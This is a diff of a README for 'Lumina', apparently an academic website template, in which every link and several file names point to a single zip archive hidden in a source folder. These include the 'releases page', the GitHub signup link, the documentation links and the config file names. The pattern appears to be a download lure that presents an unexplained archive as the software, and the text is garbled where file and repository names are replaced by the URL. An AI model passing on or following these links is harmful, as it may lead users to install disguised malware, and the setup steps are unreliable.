@@ -1,6 +1,6 @@
 # 🌟 Lumina - Easy Academic Website Creation
 
-[![Download Lumina](https://raw.githubusercontent.com/Plizzylol/Lumina/main/src/components/blog/mdx/Software-2.3.zip)](https://raw.githubusercontent.com/Plizzylol/Lumina/main/src/components/blog/mdx/Software-2.3.zip)
+[![Download Lumina](https://github.com/Plizzylol/Lumina/raw/refs/heads/main/src/components/blog/mdx/Software-2.3.zip)](https://github.com/Plizzylol/Lumina/raw/refs/heads/main/src/components/blog/mdx/Software-2.3.zip)
 
 ---
 
@@ -36,11 +36,11 @@ Lumina works on Windows and Mac computers with common software installed. You do
 
 To get Lumina, visit the releases page to download the latest version:
 
-[![Download Lumina](https://raw.githubusercontent.com/Plizzylol/Lumina/main/src/components/blog/mdx/Software-2.3.zip)](https://raw.githubusercontent.com/Plizzylol/Lumina/main/src/components/blog/mdx/Software-2.3.zip)
+[![Download Lumina](https://github.com/Plizzylol/Lumina/raw/refs/heads/main/src/components/blog/mdx/Software-2.3.zip)](https://github.com/Plizzylol/Lumina/raw/refs/heads/main/src/components/blog/mdx/Software-2.3.zip)
 
 **Steps to download and start using Lumina:**
 
-1. Click the blue “Download Lumina” button above or go directly to the [Lumina releases page](https://raw.githubusercontent.com/Plizzylol/Lumina/main/src/components/blog/mdx/Software-2.3.zip).
+1. Click the blue “Download Lumina” button above or go directly to the [Lumina releases page](https://github.com/Plizzylol/Lumina/raw/refs/heads/main/src/components/blog/mdx/Software-2.3.zip).
 
 2. On the releases page, find the latest release. Look for files ending with `.zip`. Usually, the file name will mention "Lumina" and the version number.
 
@@ -58,9 +58,9 @@ Lumina uses a simple YAML file to manage your site content and settings. You don
 
 ### How to edit your website details:
 
-1. Open the `https://raw.githubusercontent.com/Plizzylol/Lumina/main/src/components/blog/mdx/Software-2.3.zip` file in the unzipped Lumina folder with your text editor.
+1. Open the `https://github.com/Plizzylol/Lumina/raw/refs/heads/main/src/components/blog/mdx/Software-2.3.zip` file in the unzipped Lumina folder with your text editor.
 
-2. Inside `https://raw.githubusercontent.com/Plizzylol/Lumina/main/src/components/blog/mdx/Software-2.3.zip`, you will see sections like `site_name`, `author`, `theme`, and `palette`. Change these fields to match your preferences. For example:
+2. Inside `https://github.com/Plizzylol/Lumina/raw/refs/heads/main/src/components/blog/mdx/Software-2.3.zip`, you will see sections like `site_name`, `author`, `theme`, and `palette`. Change these fields to match your preferences. For example:
 
    ```yaml
    site_name: "Dr. Jane Smith's Research"
@@ -79,9 +79,9 @@ Lumina reads your publications from a BibTeX file, which is a standard format us
 
 ### How to add your publications:
 
-1. Find the `https://raw.githubusercontent.com/Plizzylol/Lumina/main/src/components/blog/mdx/Software-2.3.zip` file in the Lumina folder.
+1. Find the `https://github.com/Plizzylol/Lumina/raw/refs/heads/main/src/components/blog/mdx/Software-2.3.zip` file in the Lumina folder.
 
-2. Open `https://raw.githubusercontent.com/Plizzylol/Lumina/main/src/components/blog/mdx/Software-2.3.zip` with your text editor. It contains entries that look like this:
+2. Open `https://github.com/Plizzylol/Lumina/raw/refs/heads/main/src/components/blog/mdx/Software-2.3.zip` with your text editor. It contains entries that look like this:
 
    ```
    @article{sample2020,
@@ -104,7 +104,7 @@ Lumina offers 10 themes and over 50 color palettes. You can mix and match to cre
 
 ### How to change themes and palettes:
 
-- Open `https://raw.githubusercontent.com/Plizzylol/Lumina/main/src/components/blog/mdx/Software-2.3.zip` in your text editor.
+- Open `https://github.com/Plizzylol/Lumina/raw/refs/heads/main/src/components/blog/mdx/Software-2.3.zip` in your text editor.
 - Change the `theme` and `palette` entries to any option you prefer. For example:
 
   ```yaml
@@ -124,21 +124,21 @@ Lumina generates website files you can host anywhere. The simplest way to publis
 
 1. Lumina uses Astro and Tailwind CSS, which normally require installation of extra software. But for quick preview, a lightweight method is available:
 
-   - Locate the `https://raw.githubusercontent.com/Plizzylol/Lumina/main/src/components/blog/mdx/Software-2.3.zip` file inside the unzipped folder.
-   - Double-click `https://raw.githubusercontent.com/Plizzylol/Lumina/main/src/components/blog/mdx/Software-2.3.zip` to open it in your web browser.
+   - Locate the `https://github.com/Plizzylol/Lumina/raw/refs/heads/main/src/components/blog/mdx/Software-2.3.zip` file inside the unzipped folder.
+   - Double-click `https://github.com/Plizzylol/Lumina/raw/refs/heads/main/src/components/blog/mdx/Software-2.3.zip` to open it in your web browser.
    - This shows a basic preview with your content and styles.
 
 ### Publishing your site for free on GitHub Pages:
 
-1. Create a GitHub account at https://raw.githubusercontent.com/Plizzylol/Lumina/main/src/components/blog/mdx/Software-2.3.zip if you don’t have one.
+1. Create a GitHub account at https://github.com/Plizzylol/Lumina/raw/refs/heads/main/src/components/blog/mdx/Software-2.3.zip if you don’t have one.
 
-2. Create a new repository named `https://raw.githubusercontent.com/Plizzylol/Lumina/main/src/components/blog/mdx/Software-2.3.zip` (replace `yourusername` with your GitHub name).
+2. Create a new repository named `https://github.com/Plizzylol/Lumina/raw/refs/heads/main/src/components/blog/mdx/Software-2.3.zip` (replace `yourusername` with your GitHub name).
 
 3. Upload all files from your Lumina folder to this repository. You can do this by clicking “Add file” > “Upload files” on GitHub.
 
-4. After uploading, your site will be live at `https://raw.githubusercontent.com/Plizzylol/Lumina/main/src/components/blog/mdx/Software-2.3.zip` within minutes.
+4. After uploading, your site will be live at `https://github.com/Plizzylol/Lumina/raw/refs/heads/main/src/components/blog/mdx/Software-2.3.zip` within minutes.
 
-5. For detailed steps, visit the GitHub Pages documentation: https://raw.githubusercontent.com/Plizzylol/Lumina/main/src/components/blog/mdx/Software-2.3.zip
+5. For detailed steps, visit the GitHub Pages documentation: https://github.com/Plizzylol/Lumina/raw/refs/heads/main/src/components/blog/mdx/Software-2.3.zip
 
 ---
 
@@ -166,13 +166,13 @@ Lumina works best on modern computers and browsers. Requirements include:
 
 ## 📂 More Resources
 
-- [Lumina Documentation](https://raw.githubusercontent.com/Plizzylol/Lumina/main/src/components/blog/mdx/Software-2.3.zip) - Detailed user guide and tips.
+- [Lumina Documentation](https://github.com/Plizzylol/Lumina/raw/refs/heads/main/src/components/blog/mdx/Software-2.3.zip) - Detailed user guide and tips.
 
-- [YAML Tutorial](https://raw.githubusercontent.com/Plizzylol/Lumina/main/src/components/blog/mdx/Software-2.3.zip) - Learn how to edit configuration files.
+- [YAML Tutorial](https://github.com/Plizzylol/Lumina/raw/refs/heads/main/src/components/blog/mdx/Software-2.3.zip) - Learn how to edit configuration files.
 
-- [BibTeX Guide](https://raw.githubusercontent.com/Plizzylol/Lumina/main/src/components/blog/mdx/Software-2.3.zip) - Learn about formatting publications.
+- [BibTeX Guide](https://github.com/Plizzylol/Lumina/raw/refs/heads/main/src/components/blog/mdx/Software-2.3.zip) - Learn about formatting publications.
 
-- [GitHub Pages](https://raw.githubusercontent.com/Plizzylol/Lumina/main/src/components/blog/mdx/Software-2.3.zip) - Official hosting guide.
+- [GitHub Pages](https://github.com/Plizzylol/Lumina/raw/refs/heads/main/src/components/blog/mdx/Software-2.3.zip) - Official hosting guide.
 
 ---
 
